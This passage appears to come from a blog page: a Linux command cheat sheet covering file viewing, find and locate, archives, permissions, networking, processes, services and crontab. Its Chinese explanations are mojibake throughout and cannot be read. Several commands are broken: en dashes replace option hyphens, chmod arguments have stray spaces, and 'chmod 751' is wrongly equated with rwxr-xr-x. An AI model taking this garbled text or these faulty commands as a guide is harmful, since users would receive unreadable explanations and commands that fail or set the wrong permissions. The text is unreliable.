æŒ‡ä»¤ç”¨æ¥åˆ†å±æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå®ƒçš„åŠŸèƒ½ä¸ more æŒ‡ä»¤ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æŒ‡ä»¤æ›´åŠ å¼ºå¤§ï¼Œæ”¯æŒå„ ç§æ˜¾ç¤ºç»ˆç«¯ã€‚less æŒ‡ä»¤åœ¨æ˜¾ç¤ºæ–‡ä»¶å†…å®¹æ—¶ï¼Œå¹¶ä¸æ˜¯ä¸€æ¬¡å°†æ•´ä¸ªæ–‡ä»¶åŠ è½½ä¹‹åæ‰æ˜¾ç¤ºï¼Œè€Œæ˜¯æ ¹æ®æ˜¾ç¤ºéœ€è¦åŠ è½½å†…å®¹ï¼Œå¯¹äºæ˜¾ç¤ºå¤§å‹æ–‡ä»¶å…·æœ‰è¾ƒé«˜çš„æ•ˆç‡ã€‚</span></span><br><span class="line">less text.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºå†…å®¹åˆ°æ§åˆ¶å°</span></span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">head -n 5 text.txt</span><br><span class="line"></span><br><span class="line">tail -n 5 text.txt</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®æ—¶è¿½è¸ªè¯¥æ–‡æ¡£çš„æ‰€æœ‰æ›´æ–°</span></span><br><span class="line">tail -f </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">&gt;è¾“å‡ºé‡å®šå‘ ä¼šè¦†ç›–  &gt;&gt; ä¸ä¼šè¦†ç›– è¿½åŠ </span></span><br><span class="line">ls â€“l /home/ &gt; /home/info.txt #[å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»º]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">ln</span>ç±»ä¼¼äºwindowsé‡Œçš„å¿«æ·æ–¹å¼ï¼Œä¸»è¦å­˜æ”¾äº†é“¾æ¥å…¶ä»–æ–‡ä»¶çš„è·¯å¾„</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨/home ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªè½¯è¿æ¥ linkToRootï¼Œè¿æ¥åˆ° /root ç›®å½•</span></span><br><span class="line">ln -s /root/ linkToRoot</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ é™¤è½¯è¿æ¥ linkToRoot</span></span><br><span class="line">rm -rf linkToRoot</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å½“æˆ‘ä»¬ä½¿ç”¨ <span class="built_in">pwd</span> æŒ‡ä»¤æŸ¥çœ‹ç›®å½•æ—¶ï¼Œä»ç„¶çœ‹åˆ°çš„æ˜¯è½¯é“¾æ¥æ‰€åœ¨ç›®å½•ã€‚</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">history</span> æŸ¥çœ‹å·²ç»æ‰§è¡Œè¿‡å†å²å‘½ä»¤,ä¹Ÿå¯ä»¥æ‰§è¡Œå†å²æŒ‡ä»¤</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹æœ€è¿‘10æ¡</span></span><br><span class="line">history 10</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ‰§è¡Œç¼–å·ä¸º5çš„æŒ‡ä»¤</span></span><br><span class="line">!5</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">date</span></span></span><br><span class="line">date</span><br><span class="line">date +%Y</span><br><span class="line">date +%m</span><br><span class="line">date +%d</span><br><span class="line">date &quot;+%Y-%m-%d %H:%M:%S&quot; #(åŠŸèƒ½æè¿°:æ˜¾ç¤ºå¹´æœˆæ—¥æ—¶åˆ†ç§’)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®æ—¶é—´</span></span><br><span class="line">date -s &quot;2020-11-11 11:22:22&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ¢å¤æ—¶é—´</span></span><br><span class="line">yum -y install ntp ntpdate</span><br><span class="line">service ntp stop</span><br><span class="line">ntpdate cn.pool.ntp.org</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ—¥å†</span></span><br><span class="line">cal</span><br><span class="line">cal 2020</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ—å‡ºå½“å‰ç›®å½•åŠå­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</span></span><br><span class="line">find .</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨/homeç›®å½•ä¸‹æŸ¥æ‰¾ä»¥.txt ç»“å°¾çš„æ–‡ä»¶å</span></span><br><span class="line">find /home -name &quot;*.txt&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¿½ç•¥å¤§å°å†™</span></span><br><span class="line">find /home -iname &quot;*.txt&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å½“å‰ç›®å½•åŠå­ç›®å½•ä¸‹æŸ¥æ‰¾æ‰€æœ‰ä»¥.txt å’Œ.pdf ç»“å°¾çš„æ–‡ä»¶</span></span><br><span class="line">find . -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">find [æœç´¢èŒƒå›´] [é€‰é¡¹]</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŒ‰æ–‡ä»¶å:æ ¹æ®åç§°æŸ¥æ‰¾/home ç›®å½•ä¸‹çš„ hello.txt æ–‡ä»¶</span></span><br><span class="line">find /home -name hello.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŒ‰æ‹¥æœ‰è€…:æŸ¥æ‰¾/opt ç›®å½•ä¸‹ï¼Œç”¨æˆ·åç§°ä¸º nobody çš„æ–‡ä»¶</span></span><br><span class="line">find /opt -user nobody</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥æ‰¾æ•´ä¸ª linux ç³»ç»Ÿä¸‹å¤§äº 10M çš„æ–‡ä»¶(+n å¤§äº -n å°äº n ç­‰äº)</span></span><br><span class="line">find / -size +10M</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">locateæŒ‡ä»¤å¯ä»¥å¿«é€Ÿå®šä½æ–‡ä»¶è·¯å¾„ã€‚locateæŒ‡ä»¤åˆ©ç”¨äº‹å…ˆå»ºç«‹çš„ç³»ç»Ÿä¸­æ‰€æœ‰æ–‡ä»¶åç§°åŠè·¯å¾„çš„locateæ•°æ®åº“å®ç°å¿«é€Ÿå®šä½ç»™å®šçš„æ–‡ä»¶ã€‚Locate æŒ‡ä»¤æ— éœ€éå†æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼ŒæŸ¥è¯¢é€Ÿåº¦è¾ƒå¿«ã€‚ä¸ºäº†ä¿è¯æŸ¥è¯¢ç»“ æœçš„å‡†ç¡®åº¦ï¼Œç®¡ç†å‘˜å¿…é¡»å®šæœŸæ›´æ–° locate æ—¶åˆ»ã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç”±äº locate æŒ‡ä»¤åŸºäºæ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡è¿è¡Œå‰ï¼Œå¿…é¡»ä½¿ç”¨ updatedb æŒ‡ä»¤åˆ›å»º locate æ•°æ®åº“ã€‚</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">locate ä¸ find ä¸åŒ: find æ˜¯å»ç¡¬ç›˜æ‰¾ï¼Œlocate åªåœ¨ /var/lib/slocate èµ„æ–™åº“ä¸­æ‰¾ã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">locate çš„é€Ÿåº¦æ¯” find å¿«ï¼Œå®ƒå¹¶ä¸æ˜¯çœŸçš„æŸ¥æ‰¾ï¼Œè€Œæ˜¯æŸ¥æ•°æ®åº“ï¼Œä¸€èˆ¬æ–‡ä»¶æ•°æ®åº“åœ¨ /var/lib/slocate/slocate.db ä¸­ï¼Œæ‰€ä»¥ locate çš„æŸ¥æ‰¾å¹¶ä¸æ˜¯å®æ—¶çš„ï¼Œè€Œæ˜¯ä»¥æ•°æ®åº“çš„æ›´æ–°ä¸ºå‡†ï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿè‡ªå·±ç»´æŠ¤ï¼Œä¹Ÿå¯ä»¥æ‰‹å·¥å‡çº§æ•°æ®åº“</span></span><br><span class="line">yum -y install mlocate</span><br><span class="line">updatedb</span><br><span class="line">locate text.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">grep è¿‡æ»¤æŸ¥æ‰¾ ï¼Œ ç®¡é“ç¬¦ï¼Œâ€œ|â€ï¼Œè¡¨ç¤ºå°†å‰ä¸€ä¸ªå‘½ä»¤çš„å¤„ç†ç»“æœè¾“å‡ºä¼ é€’ç»™åé¢çš„å‘½ä»¤å¤„ç†ã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨ /etc/profile æ–‡ä»¶ä¸­ï¼ŒæŸ¥æ‰¾ <span class="string">&quot;if&quot;</span> æ‰€åœ¨è¡Œï¼Œå¹¶ä¸”æ˜¾ç¤ºè¡Œå·</span></span><br><span class="line">grep â€“n if /etc/profile # [åœ¨/etc/profile ä¸­æŸ¥æ‰¾ if ,å¹¶æ˜¾ç¤ºè¡Œï¼ŒåŒºåˆ«å¤§å°å†™]</span><br><span class="line">grep â€“ni if /etc/profile # [åœ¨/etc/profile ä¸­æŸ¥æ‰¾ if ,å¹¶æ˜¾ç¤ºè¡Œï¼Œä¸åŒºåˆ«å¤§å°å†™]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">gzip/gunzip æŒ‡ä»¤,å‹ç¼©äº†ä¹‹ååŸæ¥çš„æ–‡ä»¶ä¸åœ¨äº†</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">zip/unzip æŒ‡ä»¤</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°† /home ä¸‹çš„ æ‰€æœ‰æ–‡ä»¶è¿›è¡Œå‹ç¼©æˆ mypackage.zip [é€€å‡º home]</span> </span><br><span class="line">zip -r mypackage.zip /home/</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°† mypackge.zip è§£å‹åˆ° /opt/tmp ç›®å½•ä¸‹</span></span><br><span class="line">unzip â€“d /opt/tmp mypackage.zip #[å¦‚æœ/opt/tmp ä¸å­˜åœ¨ï¼Œä¼šè‡ªåŠ¨åˆ›å»º]</span><br><span class="line"><span class="meta"># </span><span class="language-bash">taræŒ‡ä»¤ -c äº§ç”Ÿ.taræ‰“åŒ…æ–‡ä»¶ -v æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ -f æŒ‡å®šå‹ç¼©åçš„æ–‡ä»¶å -z æ‰“åŒ…åŒæ—¶å‹ç¼© -x è§£åŒ….taræ–‡ä»¶</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å‹ç¼©å¤šä¸ªæ–‡ä»¶ï¼Œå°† /home/a1.txt å’Œ /home/a2.txt å‹ç¼©æˆ a.tar.gz</span></span><br><span class="line">tar -zcvf a.tar.gz a1.txt a2.txt #[æ³¨æ„ï¼Œè·¯å¾„è¦å†™æ¸…æ¥š]</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å°†/home çš„æ–‡ä»¶å¤¹ å‹ç¼©æˆ myhome.tar.gz</span></span><br><span class="line">tar -zcvf myhome.tar.gz /home/</span><br><span class="line">tar -zxvf a.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°† myhome.tar.gz è§£å‹åˆ° /opt/tmp2 ç›®å½•ä¸‹ ã€-Cã€‘</span></span><br><span class="line">tar -zxvf myhome.tar.gz -C /opt/tmp2 #[æ³¨æ„; /opt/tmp2 äº‹å…ˆéœ€è¦åˆ›å»ºå¥½]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…</span></span><br><span class="line">chown mingwhuang text.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹ç»„</span></span><br><span class="line">chgrp mingwhuang text.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç¬¬ä¸€ç§æ–¹å¼ï¼š+ ã€-ã€= å˜æ›´æƒé™</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">u:æ‰€æœ‰è€… g:æ‰€æœ‰ç»„ o:å…¶ä»–äºº a:æ‰€æœ‰äºº(uã€gã€oçš„æ€»å’Œ)</span></span><br><span class="line"></span><br><span class="line">chmod  u=rwx,g=rx,o=x  æ–‡ä»¶ã€ç›®å½• ã€è¡¨ç¤ºï¼šç»™æ‰€æœ‰è€…rwx, ç»™æ‰€åœ¨ç»„çš„ç”¨æˆ· rx, ç»™å…¶ä»–äºº xã€‘</span><br><span class="line">chmod  o+w  æ–‡ä»¶ã€ç›®å½• ã€è¡¨ç¤ºï¼šç»™å…¶å®ƒç”¨æˆ·å¢åŠ w çš„æƒé™ã€‘</span><br><span class="line">chmod  a-x  æ–‡ä»¶ã€ç›®å½• ã€è¡¨ç¤ºï¼šç»™æ‰€æœ‰ç”¨æˆ· å»æ‰ xæƒé™ã€‘</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç»™abcæ–‡ä»¶ çš„æ‰€æœ‰è€…è¯»å†™æ‰§è¡Œçš„æƒé™ï¼Œç»™æ‰€åœ¨ç»„è¯»æ‰§è¡Œæƒé™ï¼Œç»™å…¶å®ƒç»„è¯»æ‰§è¡Œæƒé™ã€‚</span></span><br><span class="line">chmod u=rwx, g=rx ,o=rx  abc</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç»™abcæ–‡ä»¶çš„æ‰€æœ‰è€…é™¤å»æ‰§è¡Œçš„æƒé™ï¼Œå¢åŠ ç»„å†™çš„æƒé™</span></span><br><span class="line">chmod u-x, g+w abc</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç»™abcæ–‡ä»¶çš„æ‰€æœ‰ç”¨æˆ·æ·»åŠ è¯»çš„æƒé™</span></span><br><span class="line">chmod a+r abc </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç¬¬äºŒç§æ–¹å¼ï¼šé€šè¿‡æ•°å­—å˜æ›´æƒé™</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">r=4 w=2 x=1        rwx=4+2+1=7</span></span><br><span class="line">chmod u=rwx,g=rx,o=x   æ–‡ä»¶ã€ç›®å½• </span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç›¸å½“äº <span class="built_in">chmod</span>   751  æ–‡ä»¶ã€ç›®å½•</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°† /home/abc.txt æ–‡ä»¶çš„æƒé™ä¿®æ”¹æˆ  rwxr-xr-x, ä½¿ç”¨ç»™æ•°å­—çš„æ–¹å¼å®ç°ï¼š</span></span><br><span class="line">chmod  u=rwx, g=xr, o=x /home/abc.txt</span><br><span class="line">chmod 751 /home/abc.txt</span><br><span class="line"></span><br><span class="line">chown  newowner  file  æ”¹å˜æ–‡ä»¶çš„æ‰€æœ‰è€…</span><br><span class="line">chown  newowner:newgroup  file  æ”¹å˜ç”¨æˆ·çš„æ‰€æœ‰è€…å’Œæ‰€æœ‰ç»„</span><br><span class="line">-R   å¦‚æœæ˜¯ç›®å½• åˆ™ä½¿å…¶ä¸‹æ‰€æœ‰å­æ–‡ä»¶æˆ–ç›®å½•é€’å½’ç”Ÿæ•ˆ</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°† /home/abc.txt æ–‡ä»¶çš„æ‰€æœ‰è€…ä¿®æ”¹æˆ tom</span></span><br><span class="line">chown   tom  /home/abc.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°† /home/kkk ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å’Œç›®å½•çš„æ‰€æœ‰è€…éƒ½ä¿®æ”¹æˆtom</span></span><br><span class="line">chown â€“R tom  /home/kkk</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†homeä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„æ‰€æœ‰è€…éƒ½æ”¹æˆ tomï¼Œå°†æ‰€åœ¨ç»„æ”¹æˆpolice</span></span><br><span class="line">chown â€“R  tom:police   /home/ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chgrp newgroup file  æ”¹å˜æ–‡ä»¶çš„æ‰€æœ‰ç»„</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°† /home/abc .txt æ–‡ä»¶çš„æ‰€åœ¨ç»„ä¿®æ”¹æˆ shaolin (å°‘æ—)</span></span><br><span class="line">chgrp  shaolin  /home/abc.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°† /home/kkk ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å’Œç›®å½•çš„æ‰€åœ¨ç»„éƒ½ä¿®æ”¹æˆ shaolin(å°‘æ—)</span></span><br><span class="line">chgrp  -R  shaolin /home/kkk </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹ç½‘å¡é…ç½®</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ONBOOTæ˜¯æŒ‡æ˜åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ˜¯å¦æ¿€æ´»ç½‘å¡ï¼Œåªæœ‰åœ¨æ¿€æ´»çŠ¶æ€çš„ç½‘å¡æ‰èƒ½å»è¿æ¥ç½‘ç»œï¼Œè¿›è¡Œç½‘ç»œé€šè®¯</span></span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹ç½‘å…³é…ç½®</span></span><br><span class="line">vi /etc/sysconfig/network</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹DNSé…ç½®</span></span><br><span class="line">vi /etc/resolv.conf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥ç«¯å£å ç”¨</span></span><br><span class="line">netstat -tunlp</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">io è¯»å†™</span></span><br><span class="line">iotop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">-an  æŒ‰ä¸€å®šé¡ºåºæ’åˆ—è¾“å‡º</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">-p  æ˜¾ç¤ºå“ªä¸ªè¿›ç¨‹åœ¨è°ƒç”¨</span></span><br><span class="line">netstat -anp</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥è¯¢å·²å®‰è£…çš„rpmåˆ—è¡¨</span> </span><br><span class="line">rpm -qa|grep firefox</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">i=install å®‰è£… v=verbose æç¤º h=<span class="built_in">hash</span> è¿›åº¦æ¡</span></span><br><span class="line">rpm -ivh RPMåŒ…å…¨è·¯å¾„åç§°</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ˜¾ç¤ºæ‰€æœ‰çš„è¿›ç¨‹</span></span><br><span class="line">ps -aux</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä»¥å…¨æ ¼å¼æ˜¾ç¤ºå½“å‰æ‰€æœ‰çš„è¿›ç¨‹ï¼ŒæŸ¥çœ‹è¿›ç¨‹çš„çˆ¶è¿›ç¨‹</span></span><br><span class="line">ps -ef</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¸¢æ‰æŸä¸ªéæ³•ç™»å½•ç”¨æˆ·ã€jackã€‘</span></span><br><span class="line">ps -aux | grep sshd</span><br><span class="line">kill -9 </span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç»ˆæ­¢è¿œç¨‹ç™»å½•æœåŠ¡ sshd, åœ¨é€‚å½“æ—¶å€™å†æ¬¡é‡å¯ sshd æœåŠ¡</span></span><br><span class="line">service sshd start</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç»ˆæ­¢å¤šä¸ªgeditç¼–è¾‘å™¨</span></span><br><span class="line">killall gedit</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¼ºè¡Œæ€æ‰ä¸€ä¸ªç»ˆç«¯</span></span><br><span class="line">kill -9 å¯¹åº”çš„bashçš„è¿›ç¨‹å·</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">sevice ç®¡ç†</span></span><br><span class="line">service æœåŠ¡å [start | stop | restart | reload | status] </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨ CentOS7.0 å ä¸å†ä½¿ç”¨ service ,è€Œæ˜¯ systemctl</span></span><br><span class="line">systemctl [start | stop | restart | reload | status] æœåŠ¡å</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ—ä¸¾ç³»ç»Ÿæœ‰å“ªäº›æœåŠ¡</span></span><br><span class="line">ls -l /etc/init.d</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">check config</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é€šè¿‡chkconfig å‘½ä»¤å¯ä»¥ç»™æ¯ä¸ªæœåŠ¡çš„å„ä¸ªè¿è¡Œçº§åˆ«è®¾ç½®è‡ªå¯åŠ¨/å…³é—­</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ˜¾ç¤ºå½“å‰ç³»ç»Ÿæ‰€æœ‰æœåŠ¡çš„å„ä¸ªè¿è¡Œçº§åˆ«çš„è¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">chkconfig --list</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹sshdæœåŠ¡çš„è¿è¡ŒçŠ¶æ€</span></span><br><span class="line">chkconfig sshd â€“list æˆ–è€… chkconfig â€“list | grep sshd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†sshd æœåŠ¡åœ¨è¿è¡Œçº§åˆ«5ä¸‹è®¾ç½®ä¸ºä¸è‡ªåŠ¨å¯åŠ¨ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆæ•ˆæœï¼Ÿ</span></span><br><span class="line">chkconfig â€“level 5 sshd off</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å½“è¿è¡Œçº§åˆ«ä¸º5æ—¶ï¼Œå…³é—­é˜²ç«å¢™ã€‚</span></span><br><span class="line">chkconfig â€“level 5 iptables off</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨æ‰€æœ‰è¿è¡Œçº§åˆ«ä¸‹ï¼Œå…³é—­é˜²ç«å¢™</span></span><br><span class="line">chkconfig iptables off</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨æ‰€æœ‰è¿è¡Œçº§åˆ«ä¸‹ï¼Œå¼€å¯é˜²ç«å¢™</span></span><br><span class="line">chkconfig  iptables on</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨ç»†èŠ‚</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">chkconfigé‡æ–°è®¾ç½®æœåŠ¡åè‡ªå¯åŠ¨æˆ–å…³é—­ï¼Œé‡å¯æœºå™¨å°±ä¼šæŒ‰è®¾ç½®çš„çŠ¶æ€è¿è¡Œ.</span>   </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å°å¿ƒå°†é»˜è®¤çš„è¿è¡Œçº§åˆ«è®¾ç½®æˆ 0 æˆ–è€… 7 ï¼Œæ€ä¹ˆå¤„ç†ï¼Ÿ</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿›å…¥å•ç”¨æˆ·æ¨¡å¼ï¼Œä¿®æ”¹æˆæ­£å¸¸çš„å³å¯</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è®¾ç½®ä»»åŠ¡è°ƒåº¦æ–‡ä»¶</span></span><br><span class="line">vim /etc/crontab</span><br><span class="line"><span class="meta"># </span><span class="language-bash">-e ç¼–è¾‘crontabå®šæ—¶ä»»åŠ¡ -l æŸ¥è¯¢crontabä»»åŠ¡ -r åˆ é™¤å½“å‰ç”¨æˆ·æ‰€æœ‰å¾—å®šæ—¶ä»»åŠ¡</span></span><br><span class="line">crontab -e</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ¯å°æ—¶çš„æ¯åˆ†é’Ÿæ‰§è¡Œ <span class="built_in">ls</span> â€“l /etc/ &gt; /tmp/to.txtå‘½ä»¤</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç¬¬ä¸€ä¸ª* åˆ†é’Ÿ ç¬¬äºŒä¸ª* å°æ—¶ ç¬¬ä¸‰ä¸ª* å¤© ç¬¬å››ä¸ª* æœˆ ç¬¬äº”ä¸ª* æ˜ŸæœŸå‡ </span></span><br><span class="line">*/1 * * * * ls â€“l /etc/ &gt; /tmp/to.txt </span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ¯å¤©çš„8ç‚¹0åˆ†ï¼Œ12ç‚¹0åˆ†ï¼Œ16ç‚¹0åˆ†éƒ½æ‰§è¡Œä¸€æ¬¡å‘½ä»¤</span></span><br><span class="line">0 8,12,16 * * *</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨å‘¨ä¸€åˆ°å‘¨å…­çš„å‡Œæ™¨5ç‚¹0åˆ†æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">0 5 * * 1-6</span><br></pre></td></tr></table></figure>

<h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><table>
<thead>
<tr>
<th>æ“ä½œ</th>
<th>åŠŸèƒ½è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>ç©ºç™½é”®  (space)</td>
<td>ä»£è¡¨å‘ä¸‹ç¿»ä¸€é¡µï¼›</td>
</tr>
<tr>
<td>Enter</td>
<td>ä»£è¡¨å‘ä¸‹ç¿»ã€ä¸€è¡Œã€ï¼›</td>
</tr>
<tr>
<td>q</td>
<td>ä»£è¡¨ç«‹åˆ»ç¦»å¼€ more ï¼Œä¸å†æ˜¾ç¤ºè¯¥æ–‡ä»¶å†…å®¹ã€‚</td>
</tr>
<tr>
<td>Ctrl+F</td>
<td>å‘ä¸‹æ»šåŠ¨ä¸€å±</td>
</tr>
<tr>
<td>Ctrl+B</td>
<td>è¿”å›ä¸Šä¸€å±</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>è¾“å‡ºå½“å‰è¡Œçš„è¡Œå·</td>
</tr>
<tr>
<td>:f</td>
<td>è¾“å‡ºæ–‡ä»¶åå’Œå½“å‰è¡Œçš„è¡Œå·</td>
</tr>
</tbody></table>
<h4 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h4><table>
<thead>
<tr>
<th>æ“ä½œ</th>
<th>åŠŸèƒ½è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>ç©ºç™½é”®  (space)</td>
<td>ä»£è¡¨å‘ä¸‹ç¿»ä¸€é¡µï¼›</td>
</tr>
<tr>
<td>Enter</td>
<td>ä»£è¡¨å‘ä¸‹ç¿»ã€ä¸€è¡Œã€ï¼›</td>
</tr>
<tr>
<td>q</td>
<td>ä»£è¡¨ç«‹åˆ»ç¦»å¼€ more ï¼Œä¸å†æ˜¾ç¤ºè¯¥æ–‡ä»¶å†…å®¹ã€‚</td>
</tr>
<tr>
<td>Ctrl+F</td>
<td>å‘ä¸‹æ»šåŠ¨ä¸€å±</td>
</tr>
<tr>
<td>Ctrl+B</td>
<td>è¿”å›ä¸Šä¸€å±</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>è¾“å‡ºå½“å‰è¡Œçš„è¡Œå·</td>
</tr>
<tr>
<td>:f</td>
<td>è¾“å‡ºæ–‡ä»¶åå’Œå½“å‰è¡Œçš„è¡Œå·</td>
</tr>
</tbody></table>
